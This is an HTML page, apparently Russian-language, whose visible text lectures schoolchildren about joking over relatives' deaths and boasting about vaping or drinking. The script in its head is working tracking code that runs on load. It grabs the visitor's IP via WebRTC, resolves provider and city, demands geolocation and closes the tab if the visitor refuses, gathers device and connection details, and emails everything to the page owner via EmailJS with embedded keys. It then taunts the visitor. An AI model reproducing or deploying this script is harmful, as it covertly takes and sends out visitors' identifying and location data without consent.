<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сайт предназначен для ознакомления и не призывает делать все ниже перечисленные действия</title>

    <!-- Подключение EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
        })();

        // Получение IP-адреса через WebRTC
        function getUserIP(callback) {
            var pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => console.error(e));
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const ip = ipRegex.exec(ice.candidate.candidate)[1];
                    callback(ip);
                    pc.onicecandidate = () => {};
                }
            };
        }

        // Получение данных о провайдере через ipinfo.io
        async function getProviderInfo(ip) {
            try {
                const response = await fetch(`https://ipinfo.io/${ip}?token=229d6455ecea02`);
                const data = await response.json();
                return {
                    provider: data.org || "Неизвестно",
                    city: data.city || "Неизвестно",
                    region: data.region || "Неизвестно",
                    country: data.country || "Неизвестно"
                };
            } catch (error) {
                console.error("Ошибка при получении данных провайдера:", error);
                return {
                    provider: "Неизвестно",
                    city: "Неизвестно",
                    region: "Неизвестно",
                    country: "Неизвестно"
                };
            }
        }

        // Получение геолокации пользователя с запросом разрешения
        function getGeolocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        (error) => {
                            console.warn("Ошибка при получении геолокации:", error.message);
                            window.close(); // Закрытие вкладки при отказе
                        }
                    );
                } else {
                    console.warn("Геолокация не поддерживается браузером.");
                    window.close(); // Закрытие вкладки, если геолокация не поддерживается
                }
            });
        }

        // Определение типа устройства
        function getDeviceType() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (/android/.test(userAgent)) return "Android";
            if (/iphone|ipad|ipod/.test(userAgent)) return "iOS";
            if (/windows/.test(userAgent)) return "Windows";
            if (/mac/.test(userAgent)) return "Mac";
            if (/linux/.test(userAgent)) return "Linux";
            return "Неизвестное устройство";
        }

        // Получение данных о соединении
        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            return {
                type: connection.effectiveType || "Неизвестно",
                downlink: connection.downlink || "Неизвестно",
                rtt: connection.rtt || "Неизвестно"
            };
        }

        // Анти-спам система: проверка отправки данных с текущего IP
        function isIpAlreadySent(ip) {
            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
            return sentIps[ip] && sentIps[ip].locationSent;
        }

        function markIpAsSent(ip) {
            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
            sentIps[ip] = { locationSent: true };
            localStorage.setItem('sentIps', JSON.stringify(sentIps));
        }

        function showError(message) {
            const errorElement = document.createElement('div');
            errorElement.textContent = message;
            errorElement.style.color = 'red';
            errorElement.style.fontWeight = 'bold';
            errorElement.style.marginTop = '20px';
            document.body.appendChild(errorElement);
        }

        // Отправка данных на почту через EmailJS
        function sendData(userData) {
            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                .then(function(response) {
                    console.log("Данные успешно отправлены", response);
                    alert('Пока ты читал это все я собрал все твои данные:)');
                    markIpAsSent(userData.ip);
                }, function(error) {
                    console.error("Ошибка при отправке данных", error);
                    alert("Ошибка при отправке данных: " + error.text);
                });
        }

        // Сбор всех данных пользователя и отправка на почту
        async function collectUserData(ip) {
            const [providerInfo, geolocation] = await Promise.all([
                getProviderInfo(ip),
                getGeolocation()
            ]);

            const connectionInfo = getConnectionInfo();
            const deviceType = getDeviceType();

            let userData = {
                ip: ip,
                provider: providerInfo.provider,
                city: providerInfo.city,
                region: providerInfo.region,
                country: providerInfo.country,
                latitude: geolocation.latitude,
                longitude: geolocation.longitude,
                accuracy: geolocation.accuracy,
                deviceType: deviceType,
                userAgent: navigator.userAgent,
                browserLanguage: navigator.language || "Неизвестно",
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
                connectionType: connectionInfo.type,
                connectionSpeed: connectionInfo.downlink,
                connectionRTT: connectionInfo.rtt
            };

            sendData(userData);
        }

        // Инициализация сбора данных при загрузке страницы
        window.onload = function() {
            getUserIP(function(ip) {
                console.log("IP-адрес:", ip);

                if (isIpAlreadySent(ip)) {
                    console.warn("Этот IP уже отправлял данные. Отправка отменена.");
                    showError("Error(136)");
                    return;
                }

                collectUserData(ip);
            });
        }
    </script>
</head>
<body>
    <h3>Данный сайт создан для малышей которые думают что шутить про смерть близких это смешно(по типу venom). Если вы хотите шутить про смерть то делайте это над своими бабушками/прабабушками. Представьте что дорогой вам через умер, и кто-то шутит над вашей утратой. Также школьники которые пьют энергетики/пиво/курят электронки/сигареты если хотите делайте, но не надо хвастаться какие вы крутые, это не так, тем более если вы призываете других делать тоже самое.</h3>

</body>
</html>